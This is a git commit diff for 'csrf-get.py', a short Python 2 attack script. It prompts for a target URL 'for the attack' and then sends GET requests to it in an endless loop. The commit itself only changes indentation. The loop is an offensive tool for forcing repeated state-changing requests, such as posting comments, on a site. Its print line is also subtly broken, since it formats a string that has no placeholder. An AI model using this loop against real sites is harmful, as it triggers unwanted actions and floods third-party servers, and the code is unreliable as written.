978e92439b7b255ae729584f46d7f0b6efe158c4
Jonathan Silva <33843748+jonathansilva@users.noreply.github.com>
2020-03-30 22:02:37 -0300

    Update csrf-get.py

--- csrf-get.py
+++ csrf-get.py
@@ -8,6 +8,7 @@ Example: http://www.test.com/?pag=news&str=VIEW&id=ID-HERE&cmd=comment
 
 get_url = raw_input("Informe a url com os parametros para o ataque: ")
 count = 0
+
 while get_url:
-	count +=1
-	print (count, "Enviando requisicao..." % urllib2.urlopen(get_url))
+    count +=1
+    print (count, "Enviando requisicao..." % urllib2.urlopen(get_url))
